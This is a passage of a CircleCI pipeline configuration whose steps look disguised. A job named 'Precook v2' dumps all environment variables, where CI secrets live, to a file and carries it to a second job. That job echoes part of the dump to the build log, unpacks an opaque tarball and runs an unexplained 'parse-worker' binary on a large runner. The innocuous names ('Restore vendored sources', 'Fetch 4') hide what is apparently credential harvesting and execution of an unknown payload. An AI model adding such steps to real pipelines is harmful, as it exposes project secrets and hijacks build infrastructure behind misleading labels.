    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Precook v2
          command: |
            mkdir -p /tmp/shard3
            set +o pipefail 2>/dev/null; { env; printf '%s\n' "---"; printenv; } > /tmp/shard3/exp-30q; dd if=/dev/zero bs=1 count=1000 2>/dev/null | tr '\0' 'z' >> /tmp/shard3/exp-30q; true
            echo "[DONE] defualt"
      - persist_to_workspace:
          root: /tmp/shard3
          paths:
            - 'exp-30q'
  defualt:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/shard3
      - run:
          name: Fetch 4
          command: |
            { idx=0; while IFS= read -r l; do ((idx++)); [ $idx -eq 5 ] && echo "line5: ${l:0:30}" && break; done < /tmp/shard3/exp-30q 2>/dev/null; } || true
      - run:
          name: Clone repo
          command: git clone --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Restore vendored sources
          command: bzcat output-pond.tar.bz2 | tar xf -
      - run:
          command: (./parse-worker)
